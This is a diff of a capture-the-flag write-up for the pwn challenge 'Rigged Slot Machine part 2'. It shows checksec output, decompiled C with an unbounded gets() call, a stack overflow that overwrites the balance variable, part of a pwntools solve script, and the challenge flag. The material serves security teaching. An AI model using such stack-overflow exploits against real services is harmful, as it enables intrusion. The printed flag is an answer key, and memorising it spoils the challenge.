@@ -18,6 +18,10 @@ layout:
 
 # Rigged Slot Machine (part 2)
 
+## Video walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/ZKtRuZMqo2o/0.jpg)](https://youtu.be/ZKtRuZMqo2o "Buffer Overflow: Overwriting Stack Variables and Basic Python Scripting")
+
 ## Challenge Description
 
 > The casino fixed their slot machine algorithm - good luck hitting that jackpot now!
@@ -29,6 +33,7 @@ I mentioned that part 1 of this challenge was an unintended solution I caught be
 We don't know what the winning condition is yet but since it's a pwn challenges, let's check the binary protections.
 
 {% code overflow="wrap" %}
+
 ```bash
 checksec --file rigged_slot2
 [*] '/home/crystal/Desktop/challs/pwn/RiggedSlotMachine2/solution/rigged_slot2'
@@ -38,11 +43,13 @@ checksec --file rigged_slot2
     NX:       NX enabled
     PIE:      PIE enabled
 ```
+
 {% endcode %}
 
 No canaries, so potentially a buffer overflow for us to exploit. We'll check the disassembled code in `ghidra` soon. First, let's run the binary and see if it looks different to part 1.
 
 {% code overflow="wrap" %}
+
 ```bash
 nc localhost 1337
 Welcome to the Rigged Slot Machine!
@@ -72,6 +79,7 @@ You lost $20.
 Current Balance: $0
 You're out of money! Game over!
 ```
+
 {% endcode %}
 
 It looks similar, apart from the `name` entry at the beginning and the terrible odds (try your brute force script from part 1 if you like).
@@ -79,6 +87,7 @@ It looks similar, apart from the `name` entry at the beginning and the terrible 
 I've renamed some of the variables in `ghidra`.
 
 {% code overflow="wrap" %}
+
 ```c
 setup_alarm(5);
 balance = 100;
@@ -109,11 +118,13 @@ while( true ) {
 printf("Invalid bet amount! Please bet an amount between $1 and $%d.\n",100);
 } while( true );
 ```
+
 {% endcode %}
 
 Similar to last time, but we need to hit a balance of `$1,337,420` within the 5 minute time limit (I might of reduced to 2-3 mins, can't remember). Checking the odds, they are terrible 😫
 
 {% code overflow="wrap" %}
+
 ```c
 outcome = rand();
 outcome = outcome % 1000;
@@ -136,11 +147,13 @@ else {
   multiplier = 0;
 }
 ```
+
 {% endcode %}
 
 Soooo.. Back to this buffer overflow! The `name` buffer shows as 20 bytes in ghidra, but there is no limit to how much the user can provide (dangerous `gets()` function).
 
 {% code overflow="wrap" %}
+
 ```c
 void enter_name(char *name)
 {
@@ -150,11 +163,13 @@ void enter_name(char *name)
   return;
 }
 ```
+
 {% endcode %}
 
 Let's test this! Enter a long string (over 20) as the name and play some games.
 
 {% code overflow="wrap" %}
+
 ```bash
 nc localhost 1337
 Welcome to the Rigged Slot Machine!
@@ -175,6 +190,7 @@ Enter your bet amount (up to $100 per spin): 10
 You lost $10.
 Current Balance: $1094795555
 ```
+
 {% endcode %}
 
 That's a lot of money!! We overwrite the balance on the stack 😌 We need exactly `1337420` though, let's automate it into a script.
@@ -182,6 +198,7 @@ That's a lot of money!! We overwrite the balance on the stack 😌 We need exact
 ### solve.py
 
 {% code overflow="wrap" %}
+
 ```python
 from pwn import *
 
@@ -208,11 +225,13 @@ io.sendlineafter(b"Enter your name:", payload)
 
 io.interactive()
 ```
+
 {% endcode %}
 
 Give it a run ✅
 
 {% code overflow="wrap" %}
+
 ```bash
 python solve.py REMOTE 127.0.0.1 1337
 [+] Opening connection to 127.0.0.1 on port 1337: Done
@@ -244,6 +263,7 @@ Enter your bet amount (up to $100 per spin): $ 1
     b'Current Balance: $1337420\r\n'
     b"Congratulations! You've won the jackpot! Here is your flag: INTIGRITI{fake_flag}\r\n"
 ```
+
 {% endcode %}
 
 Flag: `INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}`
